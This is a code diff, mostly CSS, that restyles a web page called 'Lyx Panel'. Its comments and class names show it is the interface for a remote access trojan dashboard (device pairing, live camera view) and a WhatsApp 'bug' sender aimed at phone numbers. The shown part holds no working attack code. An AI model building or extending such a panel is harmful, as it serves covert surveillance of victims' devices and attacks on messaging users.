@@ -2,547 +2,658 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
 <title>Lyx Panel</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Segoe UI',sans-serif}
 body{
-  background:#0a0e0a;color:#00ff88;min-height:100vh;
-  padding:16px 16px 90px 16px;
+  background:#0a0505;
+  color:#fff;
+  min-height:100vh;
+  padding:16px 16px 100px;
   background-image:
-    repeating-linear-gradient(0deg,rgba(0,255,136,.10) 0,rgba(0,255,136,.10) 2px,transparent 2px,transparent 6px),
-    repeating-linear-gradient(90deg,rgba(0,255,136,.10) 0,rgba(0,255,136,.10) 2px,transparent 2px,transparent 6px),
-    radial-gradient(circle at 50% 0%,#0d1a0d 0%,#000 100%);
-  background-attachment:fixed;
+    repeating-linear-gradient(0deg,rgba(255,0,0,0.04) 0,rgba(255,0,0,0.04) 1px,transparent 1px,transparent 4px),
+    radial-gradient(circle at 50% 0%,#1a0808,#000);
 }
-
-/* ============ HEADER ============ */
 .header{
   display:flex;justify-content:space-between;align-items:center;
-  padding:16px 22px;
-  border:3px solid #00ff88;
-  background:rgba(0,255,136,.08);
-  box-shadow:0 0 30px rgba(0,255,136,.6),inset 0 0 20px rgba(0,255,136,.15);
-  margin-bottom:20px;
-  border-radius:10px;
+  padding:16px 20px;
+  border:3px solid #ff1a1a;
+  background:linear-gradient(135deg,rgba(255,26,26,0.12),rgba(120,0,0,0.08));
+  box-shadow:0 0 25px rgba(255,26,26,0.45),inset 0 0 15px rgba(255,26,26,0.1);
+  margin-bottom:18px;
+  border-radius:6px;
 }
 .logo{display:flex;align-items:center;gap:12px}
-.logo svg{width:44px;height:44px;stroke:#00ff88;fill:none;stroke-width:2.2;filter:drop-shadow(0 0 8px #00ff88)}
-.logo h1{font-size:20px;letter-spacing:4px;text-shadow:0 0 12px #00ff88;font-weight:900}
-.dot{width:12px;height:12px;border-radius:50%;background:#00ff88;box-shadow:0 0 14px #00ff88;animation:pulse 1.5s infinite}
+.logo svg{width:40px;height:40px;stroke:#ff1a1a;fill:none;stroke-width:2;filter:drop-shadow(0 0 8px #ff1a1a)}
+.logo h1{font-size:18px;letter-spacing:3px;color:#ff1a1a;text-shadow:0 0 12px #ff1a1a;font-weight:900}
+.dot{width:12px;height:12px;border-radius:50%;background:#00ff66;box-shadow:0 0 12px #00ff66;animation:pulse 1.5s infinite}
+.dot.off{background:#ff1a1a;box-shadow:0 0 12px #ff1a1a}
 @keyframes pulse{50%{opacity:.3}}
-.ws-stat{font-size:11px;letter-spacing:2px;font-weight:bold}
 
-/* ============ BOX / CARD ============ */
-.box{
-  border:3px solid #00ff88;
-  padding:20px;
-  background:rgba(0,255,136,.06);
-  margin-bottom:18px;
-  box-shadow:0 0 24px rgba(0,255,136,.35),inset 0 0 15px rgba(0,255,136,.08);
-  border-radius:10px;
-}
-.box h2{font-size:14px;letter-spacing:3px;margin-bottom:14px;text-transform:uppercase;text-shadow:0 0 8px #00ff88;font-weight:900}
+.screen{display:none}
+.screen.active{display:block;animation:fade .3s}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
-/* ============ INPUT & BUTTON ============ */
-input,textarea,select{
-  width:100%;background:#000;border:3px solid #00ff88;color:#00ff88;
-  padding:12px 16px;font-family:inherit;font-size:14px;outline:none;
-  border-radius:8px;font-weight:bold;
-  box-shadow:inset 0 0 12px rgba(0,255,136,.2),0 0 10px rgba(0,255,136,.3);
-  transition:.2s;
-  letter-spacing:1px;
-}
-input:focus,textarea:focus,select:focus{
-  box-shadow:inset 0 0 15px rgba(0,255,136,.4),0 0 20px #00ff88;
-}
-button{
-  background:rgba(0,255,136,.08);border:3px solid #00ff88;color:#00ff88;
-  padding:12px 22px;cursor:pointer;letter-spacing:2px;font-size:12px;
-  text-transform:uppercase;transition:.2s;font-weight:900;
-  border-radius:8px;
-  box-shadow:0 0 14px rgba(0,255,136,.5);
-}
-button:hover,button:active{
-  background:#00ff88;color:#000;
-  box-shadow:0 0 30px #00ff88,0 0 50px rgba(0,255,136,.6);
-  transform:translateY(-1px);
-}
-button.warn{border-color:#ffaa00;color:#ffaa00;background:rgba(255,170,0,.08);box-shadow:0 0 14px rgba(255,170,0,.5)}
-button.warn:hover{background:#ffaa00;color:#000;box-shadow:0 0 30px #ffaa00}
-button.danger{border-color:#ff2244;color:#ff2244;background:rgba(255,34,68,.08);box-shadow:0 0 14px rgba(255,34,68,.5)}
-button.danger:hover{background:#ff2244;color:#000;box-shadow:0 0 30px #ff2244}
-button.full{width:100%;margin-top:12px}
-
-/* ============ PAIRING ============ */
-.row{display:flex;gap:10px;flex-wrap:wrap}
-.code{
-  flex:1;min-width:180px;background:#000;border:3px solid #00ff88;
-  padding:16px;font-size:28px;letter-spacing:12px;text-align:center;
-  font-family:'Courier New',monospace;text-shadow:0 0 18px #00ff88;color:#00ff88;
-  border-radius:8px;font-weight:900;
-  box-shadow:inset 0 0 20px rgba(0,255,136,.3),0 0 20px rgba(0,255,136,.5);
-}
-
-/* ============ DEVICE LIST ============ */
-.dtitle{display:flex;justify-content:space-between;align-items:center;margin:22px 0 12px;padding:0 4px}
-.dtitle h2{font-size:14px;letter-spacing:4px;text-shadow:0 0 8px #00ff88;font-weight:900}
-.dlist{display:grid;gap:12px}
-.dcard{
-  border:3px solid #00ff88;background:rgba(0,255,136,.06);padding:16px;
-  display:flex;justify-content:space-between;align-items:center;transition:.2s;
-  border-radius:10px;box-shadow:0 0 16px rgba(0,255,136,.35);
-}
-.dcard:hover{
-  background:rgba(0,255,136,.14);
-  box-shadow:0 0 30px #00ff88,inset 0 0 20px rgba(0,255,136,.15);
-  transform:translateY(-2px);
-}
-.dinfo{display:flex;align-items:center;gap:12px}
-.dinfo svg{width:38px;height:38px;stroke:#00ff88;fill:none;stroke-width:2;filter:drop-shadow(0 0 5px #00ff88)}
-.dmeta h3{font-size:14px;margin-bottom:4px;font-weight:900;letter-spacing:1px}
-.dmeta p{font-size:10px;opacity:.7;letter-spacing:1px}
-
-/* ============ DASHBOARD ============ */
-#dash{display:none}
-.dh{
-  display:flex;justify-content:space-between;align-items:center;
-  padding:16px 22px;border:3px solid #00ff88;background:rgba(0,255,136,.08);
-  margin-bottom:18px;border-radius:10px;
-  box-shadow:0 0 24px rgba(0,255,136,.5),inset 0 0 15px rgba(0,255,136,.1);
-}
-.dh h2{font-size:14px;letter-spacing:3px;font-weight:900;text-shadow:0 0 10px #00ff88}
-.dh p{font-size:10px;opacity:.6;letter-spacing:1px;margin-top:3px}
-.dgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:14px}
-.fcard{
-  border:3px solid #00ff88;padding:18px;background:rgba(0,255,136,.05);
-  cursor:pointer;transition:.2s;position:relative;border-radius:10px;
-  box-shadow:0 0 18px rgba(0,255,136,.35);
-}
-.fcard:hover{
-  background:rgba(0,255,136,.14);
-  box-shadow:0 0 30px #00ff88,inset 0 0 20px rgba(0,255,136,.15);
-  transform:translateY(-3px);
-}
-.fcard svg{width:34px;height:34px;stroke:#00ff88;fill:none;stroke-width:2;margin-bottom:10px;filter:drop-shadow(0 0 6px #00ff88)}
-.fcard h3{font-size:13px;letter-spacing:1px;margin-bottom:5px;font-weight:900}
-.fcard p{font-size:10px;opacity:.6;letter-spacing:1px}
-.fbadge{
-  position:absolute;top:12px;right:12px;font-size:9px;padding:3px 9px;
-  border:2px solid #00ff88;letter-spacing:1px;border-radius:20px;font-weight:900;
-}
-.fbadge.on{background:#00ff88;color:#000;box-shadow:0 0 12px #00ff88}
-.fbadge.off{opacity:.4}
-
-/* ============ MODAL ============ */
-.mov{
-  display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
-  z-index:1000;justify-content:center;align-items:center;padding:16px;
-}
-.mov.active{display:flex}
-.modal{
-  border:3px solid #00ff88;background:#000;padding:24px;max-width:600px;width:100%;
-  box-shadow:0 0 60px #00ff88,inset 0 0 20px rgba(0,255,136,.15);
-  border-radius:12px;max-height:90vh;overflow-y:auto;
-}
-.modal h2{font-size:16px;letter-spacing:3px;margin-bottom:18px;text-shadow:0 0 10px #00ff88;font-weight:900}
-.modal label{display:block;font-size:11px;letter-spacing:1px;margin-bottom:6px;margin-top:14px;opacity:.8;font-weight:bold}
-.modal textarea{min-height:120px;resize:vertical;font-family:'Courier New',monospace}
-.mact{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
-.trow{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:2px solid rgba(0,255,136,.2)}
-.tog{
-  width:50px;height:26px;border:3px solid #00ff88;border-radius:26px;
-  position:relative;cursor:pointer;transition:.2s;background:rgba(0,0,0,.5);
-}
-.tog::after{
-  content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;
-  background:#00ff88;border-radius:50%;transition:.2s;box-shadow:0 0 8px #00ff88;
-}
-.tog.on{background:rgba(0,255,136,.35)}
-.tog.on::after{left:24px;box-shadow:0 0 14px #00ff88}
-.cview{
-  width:100%;height:280px;background:#000;border:3px solid #00ff88;
-  display:flex;justify-content:center;align-items:center;margin:14px 0;
-  position:relative;overflow:hidden;border-radius:8px;
-  box-shadow:inset 0 0 30px rgba(0,255,136,.2),0 0 20px rgba(0,255,136,.4);
-}
-.cview::before{
-  content:'LIVE';position:absolute;top:10px;left:10px;font-size:10px;
-  padding:4px 10px;background:#ff2244;color:#fff;letter-spacing:2px;
-  animation:pulse 1.5s infinite;z-index:2;border-radius:4px;font-weight:900;
-}
-.cview video{width:100%;height:100%;object-fit:cover}
-
-/* ============ LOG ============ */
-.log{
-  border:3px solid #00ff88;background:#000;padding:12px;
-  font-family:'Courier New',monospace;font-size:11px;max-height:150px;
-  overflow-y:auto;margin-top:18px;border-radius:8px;
-  box-shadow:inset 0 0 15px rgba(0,255,136,.2),0 0 16px rgba(0,255,136,.35);
-}
-.log p{margin-bottom:4px;opacity:.8}
-.log p::before{content:'> ';color:#00ff88}
-
-/* ============ BOTTOM NAV ============ */
-.navbar{
-  position:fixed;bottom:0;left:0;right:0;
-  display:flex;justify-content:space-around;
-  border-top:3px solid #00ff88;
-  background:linear-gradient(180deg,rgba(0,20,10,.98),rgba(0,0,0,.98));
-  box-shadow:0 -4px 30px rgba(0,255,136,.6);
-  padding:10px 0 14px 0;
-  z-index:900;
-}
-.navbtn{
-  flex:1;display:flex;flex-direction:column;align-items:center;gap:5px;
-  background:none;border:none;color:#00ff88;opacity:.45;
-  cursor:pointer;padding:6px;transition:.2s;font-weight:900;
-  letter-spacing:2px;font-size:10px;
-}
-.navbtn svg{width:26px;height:26px;stroke:#00ff88;fill:none;stroke-width:2.4}
-.navbtn.active{opacity:1;text-shadow:0 0 12px #00ff88;filter:drop-shadow(0 0 8px #00ff88)}
-
-/* ============ LOGIN / ACCOUNT ============ */
-.page{display:none}
-.page.active{display:block}
-
-.auth-wrap{
-  min-height:70vh;display:flex;justify-content:center;align-items:center;
-}
+/* LOGIN / REGISTER */
 .auth-box{
-  width:100%;max-width:400px;
-  border:3px solid #00ff88;padding:30px 24px;border-radius:14px;
-  background:rgba(0,255,136,.05);
-  box-shadow:0 0 40px rgba(0,255,136,.5),inset 0 0 25px rgba(0,255,136,.1);
-  text-align:center;
+  border:3px solid #ff1a1a;
+  background:rgba(20,5,5,0.9);
+  padding:30px 24px;
+  margin:40px auto;
+  max-width:420px;
+  border-radius:8px;
+  box-shadow:0 0 35px rgba(255,26,26,0.5),inset 0 0 20px rgba(255,26,26,0.05);
 }
 .auth-box h2{
-  font-size:22px;letter-spacing:5px;margin-bottom:8px;
-  text-shadow:0 0 15px #00ff88;font-weight:900;
+  color:#ff1a1a;letter-spacing:4px;font-size:20px;text-align:center;
+  margin-bottom:6px;text-shadow:0 0 12px #ff1a1a;
 }
-.auth-box p.sub{font-size:11px;opacity:.6;letter-spacing:2px;margin-bottom:24px}
-.auth-box input{margin-bottom:12px;text-align:center}
-.auth-box button{width:100%}
+.auth-box p.sub{text-align:center;font-size:11px;color:#aa6666;letter-spacing:2px;margin-bottom:24px}
+.auth-box label{display:block;font-size:11px;color:#ff8080;letter-spacing:2px;margin-bottom:6px;margin-top:14px}
+.auth-box input{
+  width:100%;background:#0a0505;border:2px solid #ff1a1a;color:#fff;
+  padding:14px;font-size:14px;outline:none;border-radius:4px;
+  letter-spacing:1px;transition:.2s;
+}
+.auth-box input:focus{box-shadow:0 0 15px rgba(255,26,26,0.6);border-color:#ff4d4d}
+.btn-main{
+  width:100%;background:linear-gradient(135deg,#ff1a1a,#aa0000);
+  color:#fff;border:none;padding:16px;margin-top:22px;
+  letter-spacing:3px;font-weight:900;font-size:14px;
+  cursor:pointer;border-radius:4px;transition:.2s;
+  box-shadow:0 0 20px rgba(255,26,26,0.6);
+  text-transform:uppercase;
+}
+.btn-main:hover{background:linear-gradient(135deg,#ff3333,#cc0000);transform:translateY(-2px)}
+.btn-outline{
+  width:100%;background:transparent;color:#ff1a1a;
+  border:2px solid #ff1a1a;padding:14px;margin-top:12px;
+  letter-spacing:3px;font-weight:900;font-size:13px;
+  cursor:pointer;border-radius:4px;transition:.2s;text-transform:uppercase;
+}
+.btn-outline:hover{background:#ff1a1a;color:#000;box-shadow:0 0 20px #ff1a1a}
 
-.acc-info{
-  border:3px solid #00ff88;padding:20px;background:rgba(0,255,136,.06);
-  border-radius:12px;box-shadow:0 0 24px rgba(0,255,136,.4);
+.success-box{
+  border:3px solid #00ff66;background:rgba(0,40,15,0.6);
+  padding:40px 24px;text-align:center;border-radius:8px;
+  max-width:420px;margin:60px auto;
+  box-shadow:0 0 35px rgba(0,255,102,0.5);
+}
+.success-box h2{color:#00ff66;font-size:26px;letter-spacing:4px;margin-bottom:12px;text-shadow:0 0 15px #00ff66}
+.success-box p{color:#88ffaa;font-size:13px;letter-spacing:2px;margin-bottom:24px}
+.success-box svg{width:80px;height:80px;stroke:#00ff66;fill:none;stroke-width:2;margin-bottom:20px;filter:drop-shadow(0 0 15px #00ff66)}
+
+/* ACCOUNT INFO */
+.account-card{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.9);
+  padding:24px;border-radius:8px;
+  box-shadow:0 0 25px rgba(255,26,26,0.4);
   margin-bottom:18px;
 }
-.acc-row{
-  display:flex;justify-content:space-between;padding:12px 0;
-  border-bottom:2px solid rgba(0,255,136,.15);font-size:13px;
+.account-card h2{
+  color:#ff1a1a;font-size:16px;letter-spacing:3px;
+  margin-bottom:20px;text-shadow:0 0 10px #ff1a1a;
 }
-.acc-row:last-child{border-bottom:none}
-.acc-row span:first-child{opacity:.7;letter-spacing:1px;font-size:11px}
-.acc-row span:last-child{font-weight:900;text-shadow:0 0 8px #00ff88}
+.info-row{
+  display:flex;justify-content:space-between;
+  padding:12px 0;border-bottom:1px solid rgba(255,26,26,0.2);
+  font-size:13px;
+}
+.info-row span:first-child{color:#aa6666;letter-spacing:1px}
+.info-row span:last-child{color:#ff4d4d;font-weight:700;letter-spacing:1px}
 
-.success-msg{
-  text-align:center;padding:40px 20px;
+/* RAT DASHBOARD */
+.pair-box{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.7);
+  padding:20px;border-radius:6px;margin-bottom:18px;
+  box-shadow:0 0 20px rgba(255,26,26,0.3);
 }
-.success-msg h1{
-  font-size:28px;letter-spacing:4px;margin-bottom:14px;
-  text-shadow:0 0 20px #00ff88;animation:pulse 1.2s infinite;
-  font-weight:900;
+.pair-box h2{
+  color:#ff1a1a;font-size:13px;letter-spacing:3px;
+  margin-bottom:14px;text-shadow:0 0 8px #ff1a1a;
 }
-.success-msg p{font-size:13px;opacity:.7;letter-spacing:1px}
+.code-display{
+  background:#000;border:3px solid #ff1a1a;
+  padding:18px;font-size:32px;letter-spacing:12px;
+  text-align:center;font-family:'Courier New',monospace;
+  color:#ff1a1a;text-shadow:0 0 18px #ff1a1a;
+  border-radius:4px;margin-bottom:12px;font-weight:900;
+}
+.row-btn{display:flex;gap:8px}
+.row-btn button{
+  flex:1;background:transparent;border:2px solid #ff1a1a;color:#ff1a1a;
+  padding:12px;letter-spacing:2px;font-size:11px;font-weight:900;
+  cursor:pointer;border-radius:4px;text-transform:uppercase;transition:.2s;
+}
+.row-btn button:hover{background:#ff1a1a;color:#000;box-shadow:0 0 15px #ff1a1a}
 
-/* ============ RESPONSIVE ============ */
-@media (max-width:500px){
-  .logo h1{font-size:15px;letter-spacing:3px}
-  .code{font-size:22px;letter-spacing:8px;padding:12px}
-  .dgrid{grid-template-columns:1fr}
+.devices-title{
+  display:flex;justify-content:space-between;align-items:center;
+  margin:22px 0 14px;
 }
+.devices-title h2{color:#ff1a1a;font-size:14px;letter-spacing:3px}
+.device-card{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.85);
+  padding:16px;border-radius:6px;margin-bottom:12px;
+  display:flex;justify-content:space-between;align-items:center;
+  transition:.2s;box-shadow:0 0 15px rgba(255,26,26,0.25);
+}
+.device-card:hover{transform:translateY(-2px);box-shadow:0 0 25px rgba(255,26,26,0.5)}
+.device-info{display:flex;align-items:center;gap:14px}
+.device-info svg{width:36px;height:36px;stroke:#ff1a1a;fill:none;stroke-width:2}
+.device-info h3{font-size:14px;color:#fff;margin-bottom:3px}
+.device-info p{font-size:10px;color:#aa6666;letter-spacing:1px}
+.open-btn{
+  background:#ff1a1a;color:#000;border:none;
+  padding:10px 16px;font-weight:900;font-size:11px;
+  letter-spacing:2px;cursor:pointer;border-radius:4px;
+  box-shadow:0 0 12px #ff1a1a;text-transform:uppercase;
+}
+.open-btn:hover{background:#ff4d4d}
+
+.fcard-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-top:14px}
+.fcard{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.85);
+  padding:16px;border-radius:6px;cursor:pointer;
+  transition:.2s;position:relative;box-shadow:0 0 15px rgba(255,26,26,0.25);
+}
+.fcard:hover{transform:translateY(-3px);box-shadow:0 0 25px rgba(255,26,26,0.6)}
+.fcard svg{width:32px;height:32px;stroke:#ff1a1a;fill:none;stroke-width:2;margin-bottom:8px}
+.fcard h3{font-size:12px;color:#ff4d4d;letter-spacing:1px;margin-bottom:4px}
+.fcard p{font-size:10px;color:#884444;letter-spacing:1px}
+.fbadge{
+  position:absolute;top:10px;right:10px;
+  font-size:9px;padding:3px 8px;border:2px solid #ff1a1a;
+  letter-spacing:1px;border-radius:3px;
+}
+.fbadge.on{background:#ff1a1a;color:#000}
+.fbadge.off{opacity:.4}
+
+.back-bar{
+  display:flex;align-items:center;gap:12px;
+  padding:14px 18px;border:3px solid #ff1a1a;
+  background:rgba(20,5,5,0.9);border-radius:6px;
+  margin-bottom:18px;box-shadow:0 0 20px rgba(255,26,26,0.4);
+}
+.back-bar button{
+  background:transparent;border:2px solid #ff1a1a;color:#ff1a1a;
+  padding:8px 16px;font-weight:900;letter-spacing:2px;font-size:11px;
+  cursor:pointer;border-radius:4px;
+}
+.back-bar button:hover{background:#ff1a1a;color:#000}
+.back-bar h2{font-size:14px;color:#ff1a1a;letter-spacing:2px;flex:1;text-shadow:0 0 8px #ff1a1a}
+
+/* WHATSAPP BUG MENU */
+.wa-header{
+  border:3px solid #ff1a1a;background:linear-gradient(135deg,#1a0808,#0a0505);
+  padding:20px;border-radius:8px;margin-bottom:16px;
+  box-shadow:0 0 25px rgba(255,26,26,0.5);
+}
+.wa-header h2{
+  color:#ff1a1a;font-size:16px;letter-spacing:3px;
+  margin-bottom:14px;text-shadow:0 0 10px #ff1a1a;
+  display:flex;align-items:center;gap:10px;
+}
+.wa-header h2 svg{width:28px;height:28px;stroke:#25D366;fill:none;stroke-width:2}
+.wa-input-row{display:flex;gap:8px;align-items:center}
+.wa-input-row svg{width:20px;height:20px;stroke:#ff1a1a;fill:none;stroke-width:2}
+.wa-input-row input{
+  flex:1;background:#000;border:2px solid #ff1a1a;color:#fff;
+  padding:12px 14px;font-size:14px;outline:none;border-radius:4px;
+  letter-spacing:2px;
+}
+.wa-input-row input:focus{box-shadow:0 0 12px rgba(255,26,26,0.6)}
+
+.bug-section{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.85);
+  padding:18px;border-radius:6px;margin-bottom:14px;
+  box-shadow:0 0 20px rgba(255,26,26,0.35);
+}
+.bug-section h3{
+  color:#ff1a1a;font-size:13px;letter-spacing:3px;
+  margin-bottom:14px;text-shadow:0 0 8px #ff1a1a;
+}
+
+/* CAROUSEL */
+.carousel{
+  display:flex;gap:14px;overflow-x:auto;
+  padding:8px 4px 16px;scroll-snap-type:x mandatory;
+  scrollbar-width:none;
+}
+.carousel::-webkit-scrollbar{display:none}
+.bug-card{
+  min-width:200px;height:180px;
+  border:3px solid #ff1a1a;border-radius:10px;
+  background:linear-gradient(135deg,#2a0808,#0a0202);
+  padding:16px;scroll-snap-align:start;position:relative;
+  transition:.2s;cursor:pointer;flex-shrink:0;
+  box-shadow:0 0 20px rgba(255,26,26,0.4);
+}
+.bug-card.selected{
+  border-color:#ffea00;
+  box-shadow:0 0 30px rgba(255,234,0,0.7);
+  background:linear-gradient(135deg,#3a1000,#1a0500);
+}
+.bug-card svg{
+  width:44px;height:44px;stroke:#ff1a1a;fill:none;stroke-width:2;
+  margin-bottom:14px;filter:drop-shadow(0 0 6px #ff1a1a);
+}
+.bug-card.selected svg{stroke:#ffea00;filter:drop-shadow(0 0 8px #ffea00)}
+.bug-card h4{
+  font-size:14px;color:#ff4d4d;letter-spacing:2px;
+  margin-bottom:6px;font-weight:900;
+}
+.bug-card.selected h4{color:#ffea00;text-shadow:0 0 10px #ffea00}
+.bug-card p{font-size:10px;color:#aa6666;letter-spacing:1px}
+.bug-card .check{
+  position:absolute;top:12px;right:12px;width:26px;height:26px;
+  border:2px solid #ff1a1a;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;color:#ff1a1a;font-weight:900;
+}
+.bug-card.selected .check{background:#ffea00;border-color:#ffea00;color:#000}
+
+.sender-section{
+  border:3px solid #ff1a1a;background:rgba(20,5,5,0.85);
+  padding:18px;border-radius:6px;margin-bottom:16px;
+  box-shadow:0 0 20px rgba(255,26,26,0.35);
+}
+.sender-section h3{
+  color:#ff1a1a;font-size:13px;letter-spacing:3px;
+  margin-bottom:14px;text-shadow:0 0 8px #ff1a1a;
+}
+.sender-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.sender-card{
+  border:3px solid #ff1a1a;border-radius:8px;
+  background:rgba(20,5,5,0.7);padding:14px;
+  text-align:center;cursor:pointer;transition:.2s;
+}
+.sender-card.selected{
+  border-color:#ffea00;background:rgba(50,20,0,0.7);
+  box-shadow:0 0 20px rgba(255,234,0,0.5);
+}
+.sender-card svg{
+  width:32px;height:32px;stroke:#ff1a1a;fill:none;stroke-width:2;margin-bottom:8px;
+}
+.sender-card.selected svg{stroke:#ffea00}
+.sender-card h4{font-size:12px;color:#ff4d4d;letter-spacing:1px;margin-bottom:4px}
+.sender-card.selected h4{color:#ffea00}
+.sender-card p{font-size:9px;color:#aa6666;letter-spacing:1px}
+.sender-card .badge{
+  display:inline-block;margin-top:6px;font-size:9px;
+  padding:2px 8px;border:1px solid #ff1a1a;border-radius:3px;
+  color:#ff1a1a;letter-spacing:1px;
+}
+.sender-card.selected .badge{border-color:#ffea00;color:#ffea00}
+
+.footer-note{
+  text-align:center;font-size:10px;color:#884444;
+  letter-spacing:1px;margin:14px 0;
+}
+
+.send-btn{
+  width:100%;background:linear-gradient(135deg,#ff1a1a,#aa0000);
+  color:#fff;border:none;padding:18px;margin-top:12px;
+  letter-spacing:4px;font-weight:900;font-size:15px;
+  cursor:pointer;border-radius:6px;transition:.2s;
+  box-shadow:0 0 25px rgba(255,26,26,0.7);text-transform:uppercase;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+}
+.send-btn svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:2}
+.send-btn:hover{background:linear-gradient(135deg,#ff3333,#cc0000);transform:translateY(-2px);box-shadow:0 0 35px rgba(255,26,26,0.9)}
+.send-btn:disabled{opacity:.5;cursor:not-allowed}
+
+/* LOADING OVERLAY */
+.loading-overlay{
+  display:none;position:fixed;inset:0;z-index:9999;
+  background:rgba(0,0,0,0.92);
+  justify-content:center;align-items:center;flex-direction:column;
+}
+.loading-overlay.active{display:flex}
+.loader-ring{
+  width:80px;height:80px;border:6px solid rgba(255,26,26,0.2);
+  border-top:6px solid #ff1a1a;border-radius:50%;
+  animation:spin 1s linear infinite;
+  box-shadow:0 0 30px rgba(255,26,26,0.7);
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-overlay h3{
+  color:#ff1a1a;font-size:16px;letter-spacing:4px;
+  margin-top:24px;text-shadow:0 0 15px #ff1a1a;
+}
+.loading-overlay .countdown{
+  color:#fff;font-size:48px;font-weight:900;
+  margin-top:12px;letter-spacing:2px;
+  text-shadow:0 0 25px #ff1a1a;
+}
+
+/* MODAL FITUR */
+.mov{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.92);
+  z-index:1000;justify-content:center;align-items:center;padding:16px}
+.mov.active{display:flex}
+.modal{
+  border:3px solid #ff1a1a;background:#0a0505;
+  padding:22px;max-width:600px;width:100%;
+  border-radius:8px;max-height:90vh;overflow-y:auto;
+  box-shadow:0 0 45px rgba(255,26,26,0.6);
+}
+.modal h2{color:#ff1a1a;font-size:15px;letter-spacing:3px;margin-bottom:16px;text-shadow:0 0 10px #ff1a1a}
+.modal label{display:block;font-size:11px;color:#ff8080;letter-spacing:2px;margin-bottom:6px;margin-top:14px}
+.modal input,.modal textarea,.modal select{
+  width:100%;background:#000;border:2px solid #ff1a1a;color:#fff;
+  padding:12px;font-size:13px;outline:none;border-radius:4px;
+  font-family:inherit;letter-spacing:1px;
+}
+.modal textarea{min-height:100px;resize:vertical;font-family:'Courier New',monospace}
+.modal input:focus,.modal textarea:focus,.modal select:focus{box-shadow:0 0 12px rgba(255,26,26,0.6)}
+.mact{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
+.mact button{
+  background:transparent;border:2px solid #ff1a1a;color:#ff1a1a;
+  padding:12px 20px;font-weight:900;font-size:11px;letter-spacing:2px;
+  cursor:pointer;border-radius:4px;text-transform:uppercase;transition:.2s;
+}
+.mact button:hover{background:#ff1a1a;color:#000;box-shadow:0 0 15px #ff1a1a}
+.mact button.primary{background:#ff1a1a;color:#000}
+.mact button.primary:hover{background:#ff4d4d}
+.trow{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,26,26,0.2)}
+.tog{width:52px;height:28px;border:2px solid #ff1a1a;border-radius:28px;position:relative;cursor:pointer;transition:.2s}
+.tog::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#ff1a1a;border-radius:50%;transition:.2s}
+.tog.on{background:rgba(255,26,26,0.4)}
+.tog.on::after{left:26px;box-shadow:0 0 12px #ff1a1a}
+.cview{width:100%;height:280px;background:#000;border:3px solid #ff1a1a;display:flex;justify-content:center;align-items:center;margin:12px 0;position:relative;overflow:hidden;border-radius:6px}
+.cview::before{content:'LIVE';position:absolute;top:10px;left:10px;font-size:11px;padding:4px 10px;background:#ff1a1a;color:#fff;letter-spacing:2px;font-weight:900;border-radius:3px;animation:pulse 1.5s infinite;z-index:2}
+.cview video{width:100%;height:100%;object-fit:cover}
+
+/* BOTTOM NAV */
+.bottom-nav{
+  position:fixed;bottom:0;left:0;right:0;
+  background:linear-gradient(180deg,rgba(20,5,5,0.98),#000);
+  border-top:3px solid #ff1a1a;
+  display:flex;justify-content:space-around;align-items:center;
+  padding:12px 8px 14px;
+  box-shadow:0 -5px 30px rgba(255,26,26,0.5);
+  z-index:500;
+}
+.nav-item{
+  display:flex;flex-direction:column;align-items:center;gap:4px;
+  padding:8px 16px;cursor:pointer;transition:.2s;
+  border-radius:8px;flex:1;max-width:120px;
+}
+.nav-item svg{width:24px;height:24px;stroke:#884444;fill:none;stroke-width:2;transition:.2s}
+.nav-item span{font-size:10px;color:#884444;letter-spacing:2px;font-weight:900;transition:.2s}
+.nav-item.active svg{stroke:#ff1a1a;filter:drop-shadow(0 0 8px #ff1a1a)}
+.nav-item.active span{color:#ff1a1a;text-shadow:0 0 8px #ff1a1a}
+.nav-item:hover svg{stroke:#ff4d4d}
+.nav-item:hover span{color:#ff4d4d}
+.nav-item.wa svg{stroke:#25D366}
+.nav-item.wa span{color:#25D366}
+.nav-item.wa.active svg{stroke:#25D366;filter:drop-shadow(0 0 8px #25D366)}
+.nav-item.wa.active span{color:#25D366;text-shadow:0 0 8px #25D366}
 </style>
 </head>
 <body>
 
-<!-- ============================ -->
-<!-- PAGE: LOGIN -->
-<!-- ============================ -->
-<div class="page" id="page-login">
-  <div class="header">
-    <div class="logo">
-      <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 20h8M12 18v2"/><circle cx="12" cy="11" r="2"/></svg>
-      <h1>LYX PANEL</h1>
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">
+    <svg viewBox="0 0 24 24"><path d="M12 2L3 6v6c0 5 3.8 9.4 9 10 5.2-.6 9-5 9-10V6l-9-4z"/><path d="M9 12l2 2 4-4"/></svg>
+    <h1>LYX PANEL</h1>
+  </div>
+  <div style="display:flex;align-items:center;gap:8px">
+    <span class="dot" id="wsDot"></span>
